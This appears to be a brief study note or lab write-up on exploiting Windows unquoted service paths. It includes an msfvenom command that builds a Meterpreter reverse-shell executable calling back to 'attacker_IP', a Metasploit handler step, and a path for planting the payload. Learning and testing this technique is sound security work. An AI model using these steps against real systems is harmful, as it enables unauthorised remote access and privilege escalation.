what is unquoted service path  ?
If we have an executable thats path is not enclosed in " "  and have a space then we have an unquoted service path 

from the screenshot we can see

**For Exploitation**

we can create our usual exe file common.exe 
using 
`msfvenom -p windows/meterpreter/reverse_tcp lhost=attacker_IP -f exe -o common.exe`
create multi handler using metasploit 

save the exploit in 
`C:\programFIles\unquotedservicePath\common`
